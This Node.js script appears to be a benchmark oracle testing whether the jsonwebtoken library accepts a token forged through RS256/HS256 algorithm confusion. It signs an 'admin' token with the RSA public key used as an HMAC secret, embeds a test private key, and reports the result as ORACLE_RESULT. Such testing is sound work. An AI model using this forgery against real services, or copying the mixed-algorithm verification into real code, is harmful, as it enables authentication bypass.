let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

function emit() {
  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed: !!operation_completed,
    exploit_succeeded: !!exploit_succeeded,
    evidence: String(evidence || '')
  }));
}

try {
  const jwt = require('jsonwebtoken');

  // Benign control: normal asymmetric flow should work.
  const privateKeyPem = [
    '-----BEGIN RSA PRIVATE KEY-----',
    'MIIBOgIBAAJBAK9j3wQm2f4m7v5v0zzakDx4zY/boYYy6bwyZhH4qzM0gc3KJ2YM',
    'BX1AHzrc4c3OJbGdv8ImZ/Sc7VcRbP5hqjMCAwEAAQJAJq2Vq6KYFAsktwVDqveN',
    'ypu32n7Z1xXHrp236UMtO4Zwzp1KimG1HjMATkUMlzUxr87hcPLZ9eczsQnUnxEk',
    'AQIhANXGr0C+MEY0S8mV+4CSkiqhSSjMBDuNIQP5CKEM5QnBAiEAzNnS/xPbbGr3',
    'UwG+329xNX1/SuKD5Vac/mswHxZ34u0CIBQwMCKaRZ3eLaxhUJW6QcgO5Kb/6VQw',
    'Wi4KFOeFHrgbAiEAjQLbTjaC4pzbO0MJdHj7FVFvXZHzVvzJeY9q24apqYkCIHtf',
    'sLsGNP6calKZYpFYuZUCDq5ZPkNcaUVbn8NKiWkj',
    '-----END RSA PRIVATE KEY-----'
  ].join('\n');

  const publicKeyPem = [
    '-----BEGIN PUBLIC KEY-----',
    'MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAK9j3wQm2f4m7v5v0zzakDx4zY/boYYy',
    '6bwyZhH4qzM0gc3KJ2YMBX1AHzrc4c3OJbGdv8ImZ/Sc7VcRbP5hqjMCAwEAAQ==',
    '-----END PUBLIC KEY-----'
  ].join('\n');

  const benignPayload = { sub: 'control-user', role: 'user' };
  const benignToken = jwt.sign(benignPayload, privateKeyPem, { algorithm: 'RS256' });
  const benignOut = jwt.verify(benignToken, publicKeyPem);
  if (!benignOut || benignOut.sub !== 'control-user' || benignOut.role !== 'user') {
    throw new Error('benign RS256 verify returned unexpected payload');
  }

  operation_completed = true;

  // Malicious case: algorithm confusion with crafted token whose header is HS256
  // and signature computed using the public key bytes as HMAC secret.
  const forgedPayload = { sub: 'attacker', admin: true };
  const forgedToken = jwt.sign(forgedPayload, publicKeyPem, { algorithm: 'HS256' });

  try {
    const out = jwt.verify(forgedToken, publicKeyPem, { algorithms: ['RS256', 'HS256'] });
    if (out && out.admin === true && out.sub === 'attacker') {
      exploit_succeeded = true;
      evidence = 'accepted forged HS256 token when verifier used RSA public key';
    } else {
      exploit_succeeded = true;
      evidence = 'forged token accepted with unexpected payload';
    }
  } catch (err) {
    exploit_succeeded = false;
    evidence = 'forged token rejected: ' + (err && err.message ? err.message : String(err));
  }
} catch (err) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'setup/benign failure: ' + (err && err.message ? err.message : String(err));
}

emit();